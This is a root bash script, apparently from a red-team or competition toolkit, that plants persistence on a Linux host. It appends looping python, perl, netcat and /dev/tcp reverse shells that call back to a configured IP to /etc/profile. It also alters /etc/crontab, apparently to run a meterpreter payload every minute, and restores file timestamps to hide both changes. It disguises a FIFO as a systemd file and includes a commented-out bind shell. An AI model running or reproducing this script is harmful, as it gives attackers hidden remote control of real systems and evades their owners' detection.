#!/bin/bash

if [ $EUID -ne 0 ]; then
	echo "[!] Must run as root"
	exit 1
fi



# *** Helper Functions ***

# Colored text output
cecho () {
	ColorOff='\033[0m'
	BWhite='\033[1;37m'
	Red='\033[0;31m'
	Yellow='\033[0;33m'
	Cyan='\033[0;36m'
	Blue='\033[0;34m'
	Purple='\033[0;35m'
	Green='\033[0;32m'

	local CechoUsage="${Red}[!] cecho usage: cecho <task|error|warning|info|debug|done> <\"log_message\">${ColorOff}"

	if [ $# -ne 2 ]; then
		echo -e "$CechoUsage"
		return 1
	fi

	local LogType=$1
	local LogMessage=$2

	case $LogType in
		"task")
			echo
			echo -e "${BWhite}[+] --- ${LogMessage}${ColorOff}"
			;;
		"error")
			echo -e "${Red}[!] ${LogMessage}${ColorOff}"
			;;
		"warning")
			echo -e "${Yellow}[-] ${LogMessage}${ColorOff}"
			;;
		"info")
			echo -e "${Cyan}[*] ${LogMessage}${ColorOff}"
			;;
		"log")
			echo -e "${Blue}[^] ${LogMessage}${ColorOff}"
			;;
		"debug")
			echo -e "${Purple}[?] ${LogMessage}${ColorOff}"
			;;
		"done")
			echo -e "${Green}[=] ${LogMessage}${ColorOff}"
			;;
		*)
			echo -e "$CechoUsage"
			;;
	esac
}

# Get a file's timestamp in YYYYMMDDhhmm format to use with "time -t"
get_timestamp () {
	if [ $# -ne 1 ]; then
		cecho error "get_timestamp usage: get_timestamp <file>"
		return 1
	fi
	
	local file="$1"

	if ! stat -L "$file" | grep "Modify" | cut -d " " -f 2,3 | cut -d ":" -f 1,2 | tr -d "-" | tr -d ":" | tr -d " "; then
		cecho error "Couldn't stat '$file'"
		return 1
	fi
}

set_timestamp () {
	if [ $# -ne 2 ]; then
		cecho error "set_timestamp usage: set_timestamp <timestamp> <file>"
		return 1
	fi

	local timestamp="$1"
	local file="$2"

	if ! touch -t "$timestamp" "$file"; then
		cecho error "Couldn't modify timestamp for '$file'"
		return 1
	else
		cecho info "Modified timestamp for '$file'"
	fi
}



# *** Configurable variables ***

IP="10.10.2.4"
NORMAL_PORT="59000"
WEB_PORT="59001"
REVERSE_PORT="59002"
BIND_PORT="60000"
FIFO="/tmp/systemd-private-68eb5cd948c04958a3aa64dc96efabaa-colord.service-73xi5h"
GLOBAL_PROFILE="/etc/profile"

METERPRETER="/tmp/linux_$NORMAL_PORT"
CRONTAB="/etc/crontab"
CRONTAB_FIND="[[:digit:]]\+[[:blank:]]\+\*[[:blank:]]\+\*[[:blank:]]\+\*[[:blank:]]\+\*[[:blank:]]\+root[[:blank:]]\+cd \/ \&\& run-parts --report \/etc\/cron\.hourly"
CRONTAB_REPLACE="\*  \*    \* \* \*   root    cd \/ \&\& run-parts --report \/etc\/cron\.hourly"
CRONTAB_REPLACE_NORMAL=$(sed 's/\\//g' <<< "$CRONTAB_REPLACE")
CRONTAB_SOMETHING="\*[[:blank:]]\+root[[:blank:]]\+"



# *** Main ***

cecho task "Persisting reverse shells in '$GLOBAL_PROFILE'"

# Boilerplate revere_shells code taken from:
# Reverse Shell as a Service - https://reverse-shell.sh/ip:port
# https://github.com/lukechilds/reverse-shell
reverse_shells="
setsid sh -c \"while true; do
  if command -v python > /dev/null 2>&1; then
    python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\\\"$IP\\\",$REVERSE_PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);' 2>/dev/null
    sleep 10
    continue
  fi

  if command -v perl > /dev/null 2>&1; then
    perl -e 'use Socket;\$i=\\\"$IP\\\";\$p=$REVERSE_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");};' 2>/dev/null
		sleep 10
		continue
  fi

  if command -v nc > /dev/null 2>&1; then
    rm $FIFO;mkfifo $FIFO;cat $FIFO|/bin/sh -i 2>&1|nc $IP $REVERSE_PORT >$FIFO
		sleep 10
		continue
  fi

  if command -v sh > /dev/null 2>&1; then
    /bin/sh -i >& /dev/tcp/$IP/$REVERSE_PORT 0>&1
		sleep 10
		continue
  fi
done\" &"

if [ -f "$GLOBAL_PROFILE" ]; then
	profile_timestamp=$(get_timestamp "$GLOBAL_PROFILE")

	if grep -q "setsid sh" "$GLOBAL_PROFILE"; then
		cecho log "Reverse shell persistence already in '$GLOBAL_PROFILE', skipping"
	else
		echo "$reverse_shells" >> "$GLOBAL_PROFILE" && cecho info "Added reverse shell persistence to '$GLOBAL_PROFILE'" || cecho error "Could not add reverse shell persistence to '$GLOBAL_PROFILE'"
	fi

	set_timestamp $profile_timestamp "$GLOBAL_PROFILE"
else
	cecho warning "'$GLOBAL_PROFILE' does not exist, skipping reverse shell persistence"
fi

cecho done "Done persisting reverse shells in '$GLOBAL_PROFILE'"



cecho task "Persisting meterpreter in '$CRONTAB' (stealthily)"

cecho debug "TO-DO: ACTUALLY REPLACE THE BINARY BECAUSE I FORGOT"

if [ -x "$METERPRETER" ]; then
	if [ -f "$CRONTAB" ]; then
		etc_timestamp=$(get_timestamp "/etc")
		crontab_timestamp=$(get_timestamp "$CRONTAB")

		if grep -q "$CRONTAB_REPLACE" "$CRONTAB"; then # what we've already replaced
			cecho log "Meterpreter persistence already in '$CRONTAB', skipping"
		elif grep -q "$CRONTAB_FIND" "$CRONTAB"; then # what we want to replace
			sed -i "s/$CRONTAB_FIND/$CRONTAB_REPLACE/g" "$CRONTAB" && cecho info "Meterpreter persistence added to '$CRONTAB'" || cecho error "Could not add meterpreter persistence to '$CRONTAB'"
		elif grep -q "$CRONTAB_SOMETHING" "$CRONTAB"; then # something exists in crontab
			first_task=$(grep -m 1 "$CRONTAB_SOMETHING" "$CRONTAB" | sed 's/\*/\\\*/g' | sed 's/\//\\\//g' | sed 's/\&/\\\&/g')
			prepended="$CRONTAB_REPLACE\n$first_task"
			sed -i "s/$first_task/$prepended/g" "$CRONTAB" && cecho info "Meterpreter persistence added to '$CRONTAB'" || echo error "Could not add meterpreter persistence to '$CRONTAB'"
		else # nothing exists in crontab
			echo "$CRONTAB_REPLACE_NORMAL" >> "$CRONTAB" && cecho info "Meterpreter persistence added to '$CRONTAB'" || cecho error "Could not add meterpreter persistence to '$CRONTAB'"
		fi

		set_timestamp $etc_timestamp "/etc"
		set_timestamp $crontab_timestamp "$CRONTAB"
	else
		cecho error "Crontab file '$CRONTAB' doesn't exist, skipping stealthy crontab persistence"
	fi
else
	cecho error "Meterpreter binary '$METERPRETER' not executable/doesn't exist, skipping stealthy crontab persistence"
fi

cecho done "Done persisting meterpreter in '$CRONTAB' (stealthily)"




# Bind shell
#if $(which nc); then
#	nc_dir=""
#	nc_name="tmp"
#	/bin/bash -c mkdir -p "/tmp/$nc_dir" && cp "/usr/bin/nc" "/tmp/$nc_dir/$nc_name" & while true; do "/tmp/$nc_dir/$nc_name" -nlp 60000 -e /bin/bash; done
#else
#	cecho warning "netcat binary not present on system, cannot install bind shell"
#fi



echo
cecho done "--- ALL PERSISTENCE PLANTED ---"
cecho debug "Don't forget to delete me!"
